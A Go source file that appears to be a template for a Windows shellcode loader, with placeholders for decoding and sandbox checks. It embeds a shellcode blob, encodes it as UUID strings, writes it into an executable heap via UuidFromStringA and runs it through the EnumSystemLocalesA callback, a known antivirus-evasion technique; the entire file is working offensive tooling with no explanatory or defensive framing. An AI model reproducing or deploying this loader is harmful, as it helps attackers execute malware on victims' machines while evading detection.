package main

import (
	"bytes"
	_ "embed"
	"encoding/binary"
	"unsafe"

	"github.com/google/uuid"
	"golang.org/x/sys/windows"
	//__IMPORT__
)

//go:embed shellcode
var shellcode []byte

//__DECODE__

func main() {
	//__SANDBOX__
	if 16-len(shellcode)%16 < 16 {
		pad := bytes.Repeat([]byte{byte(0x90)}, 16-len(shellcode)%16)
		shellcode = append(shellcode, pad...)
	}
	var uuids []string
	for i := 0; i < len(shellcode); i += 16 {
		var uuidBytes []byte
		buf := make([]byte, 4)
		binary.LittleEndian.PutUint32(buf, binary.BigEndian.Uint32(shellcode[i:i+4]))
		uuidBytes = append(uuidBytes, buf...)
		buf = make([]byte, 2)
		binary.LittleEndian.PutUint16(buf, binary.BigEndian.Uint16(shellcode[i+4:i+6]))
		uuidBytes = append(uuidBytes, buf...)
		buf = make([]byte, 2)
		binary.LittleEndian.PutUint16(buf, binary.BigEndian.Uint16(shellcode[i+6:i+8]))
		uuidBytes = append(uuidBytes, buf...)
		uuidBytes = append(uuidBytes, shellcode[i+8:i+16]...)
		u, _ := uuid.FromBytes(uuidBytes)
		uuids = append(uuids, u.String())
	}
	kernel32 := windows.NewLazySystemDLL("kernel32")
	rpcrt4 := windows.NewLazySystemDLL("Rpcrt4.dll")
	heapCreate := kernel32.NewProc("HeapCreate")
	heapAlloc := kernel32.NewProc("HeapAlloc")
	enumSystemLocalesA := kernel32.NewProc("EnumSystemLocalesA")
	uuidFromString := rpcrt4.NewProc("UuidFromStringA")
	heapAddr, _, _ := heapCreate.Call(0x00040000, 0, 0)
	addr, _, _ := heapAlloc.Call(heapAddr, 0, 0x00100000)
	addrPtr := addr
	for _, temp := range uuids {
		u := append([]byte(temp), 0)
		_, _, _ = uuidFromString.Call(uintptr(unsafe.Pointer(&u[0])), addrPtr)
		addrPtr += 16
	}
	_, _, _ = enumSystemLocalesA.Call(addr, 0)
}
